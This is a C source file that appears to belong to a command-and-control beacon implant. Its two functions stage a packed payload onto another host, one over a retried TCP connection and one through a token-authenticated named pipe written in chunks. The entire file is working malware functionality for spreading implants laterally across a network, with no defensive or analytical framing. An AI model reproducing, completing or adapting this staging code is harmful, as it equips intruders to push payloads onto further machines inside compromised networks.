#include "pch.h"

#include "stage.h"

#include "beacon.h"
#include "link.h"
#include "network.h"
#include "pipe.h"

int StagePayloadViaTcp(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	char* target = BeaconDataStringPointer(&parser);
	int port = BeaconDataInt(&parser);
	char* packed = BeaconDataBuffer(&parser);
	int packedLength = BeaconDataLength(&parser);

	NetworkInit();

	SOCKET targetSocket;
	int timeout = GetTickCount() + 60000;
	while (GetTickCount() < timeout)
	{
		targetSocket = LinkViaTcpConnect(target, port);
		if(targetSocket != INVALID_SOCKET)
		{
			send(targetSocket, packed, packedLength, 0);
			goto waitAndClose;
		}

		Sleep(1000);
	}

	LERROR("Could not connect to target (stager)");
	BeaconErrorNA(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED);

	waitAndClose:
	Sleep(1000);
	return closesocket(targetSocket);
}

void StagePayloadViaPipe(char* buffer, int length)
{
	char text[128];

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopySafe(&parser, text, sizeof(text));
	char* data = BeaconDataBuffer(&parser);
	int dataLength = BeaconDataLength(&parser);

	HANDLE hFile;
	int seconds = 0;
	int timeout = GetTickCount() + 60000;
	while(!PipeConnectWithToken(text, &hFile, 0))
	{
		if(GetLastError() == ERROR_BAD_NETPATH || GetTickCount() >= timeout)
			goto error;

		Sleep(1000);

		if (++seconds >= 10)
			goto error;
	}

	DWORD wrote;
	WriteFile(hFile, &dataLength, sizeof(dataLength), &wrote, NULL);

	int tmp = dataLength;
	for(int total = 0; total < dataLength; total += wrote)
	{
		int toWrite = dataLength - total;
		toWrite = min(toWrite, 0x2000);

		if (!WriteFile(hFile, data + total, toWrite, &wrote, NULL))
			break;	
	}

	FlushFileBuffers(hFile);
	DisconnectNamedPipe(hFile);
	CloseHandle(hFile);
	Sleep(1000);

	return;

	error:
	DWORD lastError = GetLastError();
	LERROR("Could not connect to pipe (%s): %s", text, LAST_ERROR_STR(lastError));
	BeaconErrorDS(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED, text, lastError);
}